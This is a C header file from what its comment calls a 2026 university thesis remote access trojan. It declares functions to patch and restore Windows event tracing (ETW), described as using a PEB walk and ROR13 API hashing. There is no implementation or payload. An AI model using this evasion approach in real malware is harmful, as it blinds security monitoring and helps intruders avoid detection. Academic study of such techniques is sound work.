/* etw_patch.h — ETW bypass via PEB walk + ROR13 hash
 * Giuseppe Alfonso Mangiola, TESI RAT 2026, DIEM UNISA */
#ifndef ETW_PATCH_H
#define ETW_PATCH_H
#include <windows.h>
DWORD patch_etw(void);
DWORD restore_etw(void);
#endif
